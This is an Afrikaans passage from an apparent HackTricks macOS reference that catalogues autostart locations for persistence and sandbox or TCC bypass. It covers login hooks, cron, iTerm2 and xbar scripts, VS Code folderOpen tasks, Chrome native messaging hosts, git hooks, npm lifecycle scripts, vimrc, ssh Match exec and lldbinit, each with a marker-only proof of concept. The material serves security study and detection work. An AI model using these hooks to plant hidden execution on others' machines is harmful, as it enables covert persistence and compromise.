**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Jy moet iets soos `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` kan uitvoer
  - `Ge`leë in `~/Library/Preferences/com.apple.loginwindow.plist`

Hulle is verouderd, maar kan gebruik word om opdragte uit te voer wanneer ’n gebruiker aanmeld.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Hierdie instelling word gestoor in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Om dit te verwyder:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Die een vir die root-gebruiker word gestoor in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Voorwaardelike Sandbox Bypass

> [!TIP]
> Hier kan jy beginliggings vind wat nuttig is vir **sandbox bypass**. Dit laat jou toe om iets eenvoudig uit te voer deur dit **na ’n lêer te skryf** en **minder algemene toestande te verwag**, soos spesifieke **geïnstalleerde programme, “ongewone” gebruikeraksies** of omgewings.

### Cron

**Skrywe**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Nuttig vir sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
  - Jy moet egter die `crontab`-binary kan uitvoer
  - Of root wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/usr/lib/cron/tabs/`**
  - Root word vereis vir direkte skryftoegang. Root word nie vereis as jy `crontab <file>` kan uitvoer nie
  - **Sneller**: Die skedule in die geïnstalleerde crontab. `at` en `periodic` is aparte meganismes wat hieronder bespreek word.

#### Beskrywing en uitbuiting

Lys die cron-take van die **huidige gebruiker** met:

```bash
crontab -l
```

Die launchd-plist van die stelsel se cron-daemon bevat ’n `QueueDirectories`-inskrywing vir `/usr/lib/cron/tabs`; geïnstalleerde gebruiker-crontabs word daar gestoor. Om ander gebruikers se crontabs te inspekteer, vereis root:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

In ’n weggooibare rekening kan ’n gebruiker-cron-inskrywing wat slegs ’n merker bevat, met `crontab` geïnstalleer en ná waarneming verwyder word. As jy `crontab <file>` uitvoer, **vervang dit die rekening se hele bestaande crontab**, so stoor en herstel dit as die rekening nie weggooibaar is nie:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 het voorheen TCC-permissies gehad

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Sneller**: Begin iTerm2 met ’n geskikte Python API-script in daardie vouer
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Sneller**: Begin iTerm2; die AppleScript-opstart-hook word afsonderlik gedokumenteer
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Sneller**: Skep ’n sessie met die profiel waarvan die opdrag of aanvanklike teks die payload uitvoer

#### Beskrywing & Exploitation

Die [huidige iTerm2 Python API-gids](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) dokumenteer outomatiese uitvoering van **Python**-scripts in `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Dit stel nie vas dat ’n willekeurige uitvoerbare `.sh`-lêer in daardie vouer uitgevoer word nie. Stoor dit vir ’n tydelike rekening as `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

Die [huidige iTerm2 AppleScript-gids](https://iterm2.com/documentation-scripting.html) dokumenteer afsonderlik `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, met ’n terugvalopsie na die ouer `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` wanneer die moderne vouer nie bestaan nie. ’n AppleScript wat slegs ’n merker bevat, is:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Hierdie script-voorbeelde is teen iTerm2 se dokumentasie nagegaan, maar is nie in die aktiewe lessenaarsessie uitgevoer nie. Nadat jy dit in ’n weggooibare rekening getoets het, verwyder die toetsscript en onderskeidelik `/tmp/ht-iterm-autolaunch-marker` of `/tmp/iterm2-autolaunchscpt`.

Die iTerm2-voorkeure in **`~/Library/Preferences/com.googlecode.iterm2.plist`** kan ’n profielopdrag of aanvanklike teks spesifiseer. Laasgenoemde word in ’n sessie ingetik; die uitvoering daarvan hang af van ’n shell wat dit interpreteer. [iTerm2 se profieldokumentasie](https://iterm2.com/documentation-preferences-profiles-general.html) beskryf die opdrag wat uitgevoer word wanneer ’n nuwe sessie met daardie profiel geskep word.

Hierdie instelling kan in die iTerm2-instellings opgestel word:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

En die opdrag word in die voorkeure weerspieël:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Vir ’n veilige assessering, inspekteer die gekose profiel in iTerm2-instellings of lees ’n kopie van sy voorkeurlêer. As `Initial Text` in ’n aktiewe profiel verander word, sal dit ’n gebruiker se sessies beïnvloed, daarom is geen voorkeur op die navorsings-Mac verander nie.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar xbar moet geïnstalleer wees
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Dit versoek Accessibility-toestemmings

#### Ligging

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Sneller**: Sodra xbar uitgevoer word

#### Beskrywing

As die gewilde program [**xbar**](https://github.com/matryer/xbar) geïnstalleer is, is dit moontlik om ’n shell script in **`~/Library/Application\ Support/xbar/plugins/`** te skryf wat uitgevoer sal word wanneer xbar begin word:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar Hammerspoon moet geïnstalleer wees
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Dit versoek Accessibility-toestemmings

#### Ligging

- **`~/.hammerspoon/init.lua`**
  - **Sneller**: Sodra hammerspoon uitgevoer word

#### Beskrywing

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dien as ’n outomatiseringsplatform vir **macOS** en gebruik die **LUA-skriptaal** vir sy bewerkings. Dit ondersteun veral die integrasie van volledige AppleScript-kode en die uitvoering van shell-skripte, wat sy skripmoontlikhede aansienlik uitbrei.<sup>[[13]](#references)</sup>

Die toepassing soek ’n enkele lêer, `~/.hammerspoon/init.lua`, en wanneer dit begin, word die skrip uitgevoer.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar BetterTouchTool moet geïnstalleer wees
- TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
  - Dit versoek Automation-Shortcuts- en Accessibility-toestemmings

#### Ligging

- ’n Skriplêer waarna ’n geaktiveerde BetterTouchTool-voorinstelling **reeds verwys**, of daardie voorinstelling se konfigurasie onder `~/Library/Application Support/BetterTouchTool/`. Die presiese skrippad hang af van hoe die voorinstelling opgestel is.

[BetterTouchTool se aksieverwysing](https://docs.folivora.ai/docs/actions/action-definitions/) dokumenteer shell-script- en agtergrondopdragaksies. Die opgestelde sleutelbord-, muis-, raak-, widget- of ander gebeurtenis moet plaasvind terwyl die betrokke voorinstelling aktief is; [sy snellergids](https://docs.folivora.ai/docs/configuration/new-trigger/) wys hoe hierdie kombinasie werk. ’n Willekeurige lêer in die toepassingsteunlêergids is nie ’n sneller nie. ’n Reeds opgestelde aksie wat ’n eksterne skryfbare skrip laai, is ’n meer beperkte skryf-na-uitvoer-teiken. Kode loop as die BetterTouchTool-gebruiker se rekening, onderhewig aan sy werklike macOS-toestemmings. BetterTouchTool was afwesig uit `/Applications` op die navorsings-Mac, dus is geen voorinstelling plaaslik verander of uitgevoer nie.

### Alfred

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar Alfred moet geïnstalleer wees
- TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
  - Dit versoek Automation-, Accessibility- en selfs Full-Disk Access-toestemmings

#### Ligging

- ’n Skrip of lêer waarna ’n geïnstalleerde Alfred-werkvloei **reeds verwys**, of daardie werkvloei binne die gebruiker se opgestelde `Alfred.alfredpreferences`-lêergids. Die voorkeurelêergids kan gesinkroniseer wees en is nie ’n vaste universele pad nie.

[Alfred se werkvloeigids](https://www.alfredapp.com/help/workflows/) beskryf die Powerpack-vereiste en installering deur sy UI. ’n Geïnstalleerde werkvloei se snelsleutel, sleutelwoord of ander opgestelde sneller moet geaktiveer word; [Alfred se snelsleutelvoorbeeld](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) demonstreer ’n skripaksie. [Alfred se omgewingsverwysing](https://www.alfredapp.com/help/workflows/script-environment-variables/) stel die gekose voorkeurepad as `alfred_preferences` beskikbaar. Om ’n ongeregistreerde werkvloeilêer in ’n willekeurige lêergids te plaas, bewys nie dat dit geïnstalleer of uitgevoer sal word nie. Kode loop as die aangemelde Alfred-gebruiker met sy werklike macOS-toestemmings. Alfred was afwesig uit `/Applications` op die navorsings-Mac, dus is hierdie pad slegs aan die hand van dokumentasie beoordeel.

### Raycast Script Commands en uitbreidingverversing

- **Skryfteiken:** ’n Uitvoerbare skrip in ’n lêergids wat **reeds bygevoeg** is onder Raycast Settings → Script Commands. Raycast skandeer nie ’n willekeurige nuutgeskepte lêergids nie. [Raycast se Script Commands-gids](https://manual.raycast.com/script-commands) dokumenteer lêergidregistrasie.
- **Sneller en identiteit:** ’n Gebruiker roep die geïndekseerde opdrag aan, ’n opgestelde snelsleutel of terugvalopsie roep dit aan, of Raycast verfris ’n `inline`-skrip volgens sy opgestelde `@raycast.refreshTime`. Die skrip loop as die aangemelde Raycast-gebruiker deur sy interpreter. Die [metadata-verwysing van die stroomopprojek](https://github.com/raycast/script-commands#metadata) beperk outomatiese verversing tot inline-opdragte, en [Raycast se uitbreidingmanifes](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) ondersteun afsonderlik ’n `interval` vir geïnstalleerde `no-view`- of `menu-bar`-uitbreidingsopdragte. Om bloot ’n normale skripopdrag by te voeg, skeduleer dit nie.

Vir ’n weggooibare rekening met ’n geregistreerde skriplêergids is ’n inline-skrip wat slegs ’n merker skryf:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Stoor dit in die geregistreerde gids, maak dit uitvoerbaar en laat Raycast dit verfris. Verwyder dan daardie lêer en `/tmp/ht-raycast-refresh-marker`. Raycast is nie op die navorsings-Mac onder sy gewone `/Applications`-naam gevind nie, daarom is dit deur dokumentasie gestaaf en nie plaaslik uitgevoer nie. Toeganklikheid-, Outomatisering- en lêertoestemmings bly onderhewig aan macOS-toestemmingsboodskappe.

### Outomatiese werkruimte-take in Visual Studio Code

- **Teiken om te skryf:** `.vscode/tasks.json` binne ’n werkruimte wat die gebruiker sal oopmaak.
- **Sneller:** Wanneer daardie werkruimte in VS Code oopgemaak word, maar slegs as die vouer vertrou word **en** outomatiese take toegelaat is. ’n Onbetroubare werkruimte voer nooit outomatiese take uit nie; die verstekinstelling vra die gebruiker voordat die eerste outomatiese taak uitgevoer word. [VS Code-taakdokumentasie](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) en [Werkruimtevertrouedokumentasie](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) beskryf albei voorwaardes.
- **Uitvoeringsidentiteit:** Die VS Code-gebruikersrekening, deur die gekonfigureerde taakproses. Dit is toepassingspesifieke uitvoering, nie aanmeldingsvolharding nie.

Plaas hierdie merker-alleen-taak in `.vscode/tasks.json` in ’n **nuwe, tydelike werkruimte**:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Nadat jy die vertroude werkruimte oopgemaak het en outomatiese take toegelaat het, kyk vir `.autostart-task-ran`. Verwyder die taakinskrywing en merker om skoon te maak. **Dit is teen Microsoft se dokumentasie en die geïnstalleerde VS Code 1.139.1-bundel geverifieer; dit is nie in die aktiewe lessenaarsessie uitgevoer nie.**

### Chrome native messaging hosts

- **Skryf-teiken:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` vir die huidige gebruiker, of `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` vir alle gebruikers (admin-skryftoegang benodig). Chromium en Chrome for Testing gebruik verskillende gidse; sien [Chrome se huidige paadtabel](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Sneller:** ’n Geïnstalleerde Chrome-uitbreiding met die `nativeMessaging`-toestemming roep `chrome.runtime.connectNative()` of `chrome.runtime.sendNativeMessage()` met die manifest se presiese gasheernaam. Chrome begin dan die gasheer-uitvoerbare lêer. Deur Chrome alleen oop te maak, word ’n arbitrêre nuwe native host nie uitgevoer nie; om ’n manifest te skep sonder ’n uitbreiding wat dit roep, doen niks. [Chrome se native messaging-gids](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) dokumenteer hierdie handdruk.
- **Uitvoeringsidentiteit:** Die Chrome-gebruikersrekening. Die manifest moet ’n absolute pad na ’n uitvoerbare lêer spesifiseer en die oorsprong van die uitbreiding wat dit roep, uitdruklik toelaat.

In ’n weggooibare blaaierrekening met ’n toetsuitbreiding demonstreer die volgende paar lêers die skryf-na-uitvoering-skakel. Die manifest se lêernaam moet met sy `name` ooreenstem, en `TEST_EXTENSION_ID` moet deur daardie uitbreiding se werklike ID vervang word:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Stoor hierdie JSON as `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Die uitvoerbare lêer wat slegs as merker dien by die manifest se `path` kan bevat:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Nadat die toetsuitbreiding `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` vanaf sy dienswerker of uitbreidingsbladsy aanroep, bewys die merker dat die host begin het. Hierdie minimale host implementeer nie Chrome se antwoordprotokol met lengtevoorvoegsel nie, dus kan die uitbreiding ’n boodskapfout rapporteer nadat die merker geskryf is. Verwyder die toetsmanifest, host en merker om op te ruim. Op macOS 26.5.2 was die Chrome-toepassing en albei manifestgidse teenwoordig; **die aktiewe Chrome-profiel is nie gewysig of gebruik nie**.

### Karabiner-Elements-opdragte vir sleutelgebeurtenisse

- **Skryfdoelwit:** `~/.config/karabiner/karabiner.json` in ’n rekening waar Karabiner-Elements geïnstalleer is en loop. [Karabiner se gids vir lêerliggings](https://karabiner-elements.pqrs.org/docs/json/location/) sê die toepassing hou hierdie lêer dop en herlaai dit nadat daarheen geskryf is. JSON-lêers in `assets/complex_modifications` is slegs invoerbare voorafinstellings; om bloot een daar te skryf, aktiveer nie ’n reël nie.
- **Sneller:** Die gekonfigureerde sleutelgebeurtenis nadat die reël aktief is. Die [`to.shell_command`-verwysing](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) beskryf opdraguitvoering. Dit is nie kode-uitvoering wanneer jy aanmeld of elke keer as ’n lêer geskryf word nie.
- **Uitvoeringsidentiteit:** Die aangemelde gebruiker wat Karabiner se gebruikersproses laat loop. Sy eie toestemmings en enige TCC-toegang hang af van die toepassing en weergawe.

Voeg vir ’n weggooibare toetsrekening hierdie reëlobjek by die `complex_modifications.rules`-skikking van die gekose profiel in `karabiner.json`, en behou die res van daardie profiel. Druk F18 om ’n onskadelike merker te skep, en verwyder dan hierdie reël en die merker. Die keuse van F18 voorkom dat ’n gewone tiktoets vervang word:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements was nie op die macOS 26.5.2-toetsmasjien in `/Applications` geïnstalleer nie, dus is dit ’n dokumentasie-gesteunde PoC eerder as ’n plaaslike looptydresultaat.

### Git hooks in ’n plaaslike repository

- **Skryfteiken:** ’n Uitvoerbare hook soos `<repo>/.git/hooks/post-checkout`. As `core.hooksPath` reeds gestel is, gebruik eerder daardie gekonfigureerde gids. ’n Hook wat as ’n gewone nagespoorde bronlêer vasgelê is, word nie outomaties in ’n clone geïnstalleer nie.
- **Sneller:** Die ooreenstemmende Git-bewerking. Byvoorbeeld, `post-checkout` loop ná `git checkout` of `git switch`, en kan ook ná ’n clone of worktree-skepping loop. [Git se hook-verwysing](https://git-scm.com/docs/githooks) lys die gebeure en die vereiste uitvoerbare-permissiebit; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) verander die opsoekgids.
- **Uitvoeringsidentiteit:** Die rekening wat Git uitvoer. Die hook kan slegs loop as die repository se effektiewe hooks-gids skryfbaar is vir die gebruiker en die gebruiker later die toepaslike Git-bewerking uitvoer.

Hierdie marker-only PoC skep ’n volledig weggooibare repository, installeer een hook en skakel na ’n tak oor. Dit is suksesvol met Apple Git 2.50.1 op macOS 26.5.2 uitgevoer:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### npm-lifecycle-skrifte in ’n projek

- **Skryfdoelwit:** Die `scripts`-kaart in ’n skryfbare projek se `package.json`, of ’n geïnstalleerde afhanklikheidspakket waarvan die gebruiker se lifecycle-skrip sal uitvoer. Dit is ’n haakpunt vir ’n ontwikkelingswerkvloei, nie uitvoering wanneer ’n gids oopgemaak word nie.
- **Sneller en identiteit:** ’n Latere `npm install` of `npm ci` voer, indien lifecycle-skripte toegelaat word, `preinstall`, `install` en `postinstall` uit as die gebruiker wat npm aanroep. ’n Gewone `npm run <name>` voer ook die ooreenstemmende `pre<name>`- en `post<name>`-skripte uit. [npm se lifecycle-verwysing](https://docs.npmjs.com/cli/v11/using-npm/scripts) lys die gebeure; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) kan install-lifecycle-skripte onderdruk. Weergawe- en beleidsinstellings kan beïnvloed wat toegelaat word, dus moet jy die teiken se npm-weergawe nagaan.

Hierdie marker-only PoC is met plaaslike npm in ’n weggooibare, leë gids uitgevoer. Dit laai nie afhanklikhede af nie en verander nie ’n gebruiker se projek nie:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Dit verskil van Python-interpreter-opstartlêers: npm moet die relevante installasie- of uitvoerhandeling uitvoer, terwyl Python `site`-kode tydens ’n gewone interpreter-aanroep kan laai. Generiese `Makefile`-teikens en boudaktaakdefinisies vereis insgelyks dat die gebruiker of ’n reeds gekonfigureerde nutsding daardie teiken aanroep; dit is nie afsonderlike OS-outostartpaaie nie.

### Vim-opstartkonfigurasie

- **Skryf-teiken:** `~/.vimrc` vir die gebruiker wat Vim sal begin (of ’n ander opstartlêer wat volgens Vim se inisialiseringsvolgorde gekies word). [Vim se opstartverwysing](https://vimhelp.org/starting.txt.html) dokumenteer die lêer en die `VIMINIT`/`EXINIT`-oorrides.
- **Sneller:** ’n Latere gewone Vim-begin wat hierdie konfigurasie laai. Vim se `-u NONE` omseil die gebruiker se vimrc. Dit is redigeerder-spesifieke uitvoering, nie ’n OS-aanmeldsneller nie.
- **Uitvoeringsidentiteit:** Die Vim-gebruiker se rekening.

Die volgende geïsoleerde PoC is teen macOS se `/usr/bin/vim` uitgevoer; dit skryf geen werklike Vim-voorkeure of oop dokumente nie:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim het ’n aparte gebruikerskonfigurasiepad, `$XDG_CONFIG_HOME/nvim/init.lua` of `init.vim`, en laai ook skrifte in sy `plugin/`-runtimegidse volgens sy [opstartdokumentasie](https://neovim.io/doc/user/starting/). Neovim was nie op die macOS 26.5.2-toetsmasjien geïnstalleer nie, daarom is hierdie variant nie daar uitgevoer nie.

### SSH-kliëntkonfigurasie-opdragte

- **Teikenskryfplek:** `~/.ssh/config`, of ’n ander lêer wat dit reeds insluit. Dit is ’n **kliënt**-konfigurasielêer; dit is apart van die bedienerkantse `~/.ssh/rc` wat hieronder beskryf word.
- **Sneller:** ’n Passende `ssh`-aanroep. `Match exec` voer ’n plaaslike opdrag uit terwyl die kliënt sy konfigurasie evalueer, selfs vir `ssh -G`, wat konfigurasie afdruk sonder om te koppel. `ProxyCommand` word uitgevoer wanneer die kliënt ’n passende verbinding opstel. `LocalCommand` word eers ná ’n suksesvolle verbinding uitgevoer en vereis `PermitLocalCommand yes` (die verstek is `no`). Dit het verskillende tydsberekening en voorvereistes; ’n skryfbewerking alleen voer dit nie uit nie. Sien die stroomop-[OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Uitvoeringsidentiteit:** Die plaaslike gebruiker wat `ssh` uitvoer. ’n Passende gasheer, ’n toepaslike konfigurasielêer en enige vereiste verbinding is nodig. `ssh -F` kan ’n ander konfigurasielêer kies.

Hierdie marker-only PoC is met Apple se SSH-kliënt op macOS 26.5.2 uitgevoer. `-G` toets `Match exec` sonder om ’n netwerkverbinding te maak of die gebruiker se werklike SSH-konfigurasie te lees:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Ontlêerder-inisialiseringslêers

- **Skryf-teiken:** `~/.lldbinit` of die toepassingspesifieke lêer met hoër prioriteit, soos `~/.lldbinit-lldb`. LLDB lees een wanneer die ontlêerder begin. ’n `.lldbinit` in die huidige gids word **nie** by verstek uitgevoer nie; die gebruiker moet `target.load-cwd-lldbinit` aktiveer of `--local-lldbinit` deurgee. Sien die [LLDB-handleiding](https://lldb.llvm.org/man/lldb.html).
- **Sneller en identiteit:** Die gebruiker begin LLDB sonder `--no-lldbinit`; opdragte loop as daardie gebruiker. Die blote opening van ’n projek beteken nie dat die projek se `.lldbinit` loop nie.

Die volgende toets met slegs ’n merker is op LLDB op macOS 26.5.2 uitgevoer, met ’n geïsoleerde tuisgids en werkgids:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

Vir **GDB** lys die [opstartdokumentasie van die stroomopprojek](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) `$HOME/Library/Preferences/gdb/gdbinit` en daarna `~/.gdbinit` op macOS. ’n `.gdbinit` in die huidige gids is onderhewig aan die [veilige pad vir outo-laai](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), en `-nx`/`-nh` onderdruk inisialisasielêers. GDB was nie op die toets-Mac geïnstalleer nie, dus is hierdie variant nie plaaslik uitgevoer nie.

### SSHRC

Skryfstuk: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
  - Maar ssh moet geaktiveer en gebruik word
- TCC-bypass: [✅](https://emojipedia.org/check-mark-button)
  - SSH-gebruik om FDA-toegang te hê

#### Ligging

- **`~/.ssh/rc`**
  - **Sneller**: Aanmelding via ssh
- **`/etc/ssh/sshrc`**
  - Root word vereis
  - **Sneller**: Aanmelding via ssh

> [!CAUTION]
> Om ssh aan te skakel, word Full Disk Access vereis:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Beskrywing & Uitbuiting

By verstek, tensy `PermitUserRC no` in `/etc/ssh/sshd_config` gestel is, word die skrifte **`/etc/ssh/sshrc`** en **`~/.ssh/rc`** uitgevoer wanneer ’n gebruiker **via SSH aanmeld**.<sup>[[14]](#references)</sup>

### **Aanmelditems**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet `osascript` met argumente uitvoer
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Liggings

- **Geregistreerde aanmelditem-helpertoepassing:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (algemene gebundelde ligging).
  - **Sneller:** Registrasie kan die helper onmiddellik begin; daarna begin dit met latere gebruiker-aanmeldings, onderhewig aan goedkeuring.
- **Geregistreerde gebundelde agent/daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` of `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Sneller:** ’n Goedgekeurde agent kan met registrasie en tydens latere aanmeldings begin; ’n goedgekeurde daemon begin tydens selflaai. ’n Daemon vereis administrateurgoedkeuring.

#### Beskrywing

In **Stelselinstellings → Algemeen → Aanmelditems en uitbreidings** kan gebruikers aanmeld- en agtergronditems nagaan. macOS 13 en later bied [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) om gebundelde aanmelditems, launch agents en launch daemons te registreer. Die gedrag van [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) verskil na gelang van die tipe en goedkeuringstatus. **Om ’n helper in ’n toepassingbundel te skryf, is nie voldoende om ’n nuwe aanmelditem te registreer nie.** Omgekeerd, as ’n reeds geregistreerde helper-uitvoerbare lêer skryfbaar is, kan die wysiging van daardie uitvoerbare lêer die volgende keer dat dit begin ’n uitwerking hê sonder nuwe registrasie; verifieer eers die werklike pad en kode-ondertekeningskontroles.

Die volgende is ’n leesalleen-manier om na gebundelde helpers op ’n Mac te soek; dit registreer of begin nie enige van hulle nie:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

